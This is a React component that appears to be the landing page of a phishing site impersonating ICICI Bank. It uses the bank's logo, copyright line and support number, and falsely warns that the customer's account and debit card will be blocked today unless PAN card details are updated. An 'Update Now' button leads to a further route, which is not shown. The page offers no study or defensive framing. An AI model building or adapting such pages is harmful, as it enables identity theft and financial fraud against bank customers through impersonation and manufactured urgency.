import React from 'react';
import { useNavigate } from 'react-router-dom';

const HomePage = () => {
  const navigate = useNavigate();

  const handleUpdateNow = () => {
    navigate('/main');
  };

  return (
    <div>
      <center>
        <img className="hero-logo" src="/m h.jpg" alt="ICICI Bank Logo" />
      </center>
      <div className="container">
        <div className="header"></div>
        <div className="content">
          <h2>Important Account Verification Notice</h2>
          <div className="notification">
            <p>Dear ICICI Bank Customer,</p>
            <p>Your ICICI Bank Account and Debit Card will be blocked today. Please update your PAN Card Details immediately.</p>
          </div>
          <button className="btn" onClick={handleUpdateNow}>Update Now</button>
        </div>
        <div className="footer">
          <p>© 2025 ICICI Bank. All rights reserved. For assistance, contact our customer support at
            <a href="tel:18001080">1800-1080</a>.
          </p>
        </div>
      </div>
    </div>
  );
};

export default HomePage;
